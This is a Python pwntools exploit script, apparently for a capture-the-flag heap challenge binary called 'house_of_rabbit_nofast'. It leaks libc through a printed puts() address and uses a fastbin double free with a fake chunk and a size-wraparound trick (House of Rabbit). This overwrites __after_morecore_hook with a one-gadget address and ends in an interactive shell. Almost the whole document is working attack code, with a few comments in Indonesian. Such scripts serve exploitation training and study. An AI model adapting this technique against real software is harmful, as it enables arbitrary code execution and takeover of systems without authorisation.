#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_rabbit_nofast")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "amend age" option; send new value.
def amend_age(age):
    io.send(b"3")
    io.sendafter(b"age: ", f"{age}".encode())
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- PREPARE A FAKE CHUNK -=-=-=

age = 1

io.sendafter(b"age: ", f"{age}".encode())
io.recvuntil(b"> ")


# =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-=

very_large_chunk = malloc(0x5fff8, "T" * 8) #Make mmap
free(very_large_chunk) # Ini bakal naikin mmap threshold
very_large_chunk = malloc(0x5fff8, "T" * 8) # Ini bakal diallocate sm heap

# Request 2 normal chunks.
chunk_A = malloc(0x88, b"A"*8)
dangling_ptr = malloc(0x88, b"B"*8)

# Free them.
free(chunk_A)
free(dangling_ptr)

chunk_C = malloc(0xa8, b"C" * 8)
chunk_D = malloc(0x88, b"d" * 8)

free(chunk_C)

chunk_E = malloc(0x88, "E" * 8)

free(chunk_E)
free(chunk_D)

free(dangling_ptr)

chunk_F = malloc(0x88, b"filler")
overlap = malloc(0x88, p64(elf.sym["user"]))

free(very_large_chunk) # Buat consolidate fast

amend_age(0x80001)
malloc(0x80008, "filler") # in order to move to largest bin pas scan

distance = (libc.sym["__after_morecore_hook"] - 0x20) - elf.sym["user"]

amend_age(distance + 0x111)

binsh = malloc(distance, b"/bin/sh\x00")

sh = malloc(0x88, p64(libc.address + 0x3ff5e))


malloc(0x60008, "A")
# free(binsh)

# =============================================================================

io.interactive()
